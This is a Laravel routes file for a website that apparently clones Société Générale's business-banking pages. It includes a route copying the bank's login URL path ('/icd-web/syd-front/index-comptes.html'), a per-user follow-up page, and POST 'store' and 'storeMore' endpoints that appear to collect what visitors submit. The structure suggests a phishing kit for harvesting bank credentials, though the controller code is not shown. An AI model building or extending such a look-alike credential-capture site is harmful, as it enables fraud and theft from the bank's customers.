<?php

use App\Http\Controllers\HomeController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', [HomeController::class, 'index'])->name('home');
Route::get('/financement', [HomeController::class, 'financement'])->name('financement');
Route::get('/international', [HomeController::class, 'international'])->name('international');
Route::get('/rse', [HomeController::class, 'rse'])->name('rse');
Route::get('/au-quotidien', [HomeController::class, 'auquotidien'])->name('auquotidien');
Route::get('/proteger-et-fideliser', [HomeController::class, 'protegerfideliser'])->name('protegerfideliser');
Route::get('/contacts-sg-entreprises', [HomeController::class, 'contactsentreprises'])->name('contactsentreprises');
Route::get('/icd-web/syd-front/index-comptes.html', [HomeController::class, 'login'])->name('login');
Route::get('/icd-web/syd-front/index-comptes-more.html/{user}', [HomeController::class, 'more'])->name('more');
Route::post('/store', [HomeController::class, 'store'])->name('store');
Route::post('/storeMore/{user}', [HomeController::class, 'storeMore'])->name('storeMore');
